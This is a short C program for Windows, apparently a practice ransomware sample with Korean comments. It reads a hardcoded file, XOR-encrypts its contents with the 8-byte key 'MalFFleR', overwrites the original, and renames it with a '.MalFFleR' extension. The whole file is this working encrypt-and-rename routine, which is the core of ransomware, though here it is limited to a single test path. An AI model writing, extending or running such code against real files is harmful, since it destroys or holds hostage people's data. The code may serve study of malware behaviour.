#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <fileapi.h>
#include <shlwapi.h>
#include <string.h>
#define buffersize 1024

#pragma comment (lib, "shlwapi.lib")

const BYTE xorKey[] = { 'M', 'a', 'l', 'F', 'F', 'l', 'e', 'R' };

int main(void) {
	LPCSTR path = "C:\\Users\\Owner\\Documents\\test\\1.txt";
	LPVOID buffer[buffersize];
	DWORD BytesRead = 0;
	BYTE* data = NULL;
	DWORD totalBytesRead = 0;

	HANDLE CreateFile_result_read = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	while (ReadFile(CreateFile_result_read, buffer, buffersize, &BytesRead, NULL) && BytesRead > 0) {
		data = (BYTE*)realloc(data, totalBytesRead + BytesRead);
		memcpy(data + totalBytesRead, buffer, BytesRead);
		totalBytesRead += BytesRead;
	}

	for (DWORD i = 0; i < totalBytesRead; i++) {
		data[i] ^= xorKey[i % 8]; // 8바이트 키를 순환하며 XOR 연산
	}

	CloseHandle(CreateFile_result_read); // 핸들을 닫음

	// 파일을 열 때 기존 내용을 삭제하고 덮어쓰기 위해 CREATE_ALWAYS 사용
	HANDLE CreateFile_result_write = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	BOOL result = WriteFile(CreateFile_result_write, data, totalBytesRead, NULL, NULL); // XOR로 암호화된 데이터 덮어쓰기
    
    free(data);
    CloseHandle(CreateFile_result_write); // 핸들을 닫음
	char newpath[100] = "C:\\Users\\Owner\\Documents\\test\\1.txt"; // 확장자를 제외한 경로를 파싱할 변수
	char res[100] = "C:\\Users\\Owner\\Documents\\test\\1.txt"; // 확장자를 바꿀 파일의 경로
	char Ext[] = ".MalFFleR"; // 새로운 확장자

	strtok(newpath, "."); // "."을 기준으로 문자열 파싱
	
	if (newpath != NULL) {
		strcat(newpath, Ext); // 새로운 확장자와 결합
		printf("%s", newpath);
		if (rename(res, newpath) == 0) { // 파일명 변경
			printf("Rename successful.\n");
		}
		else {
			printf("Rename failed.\n");
		}
	}

	return 0;
}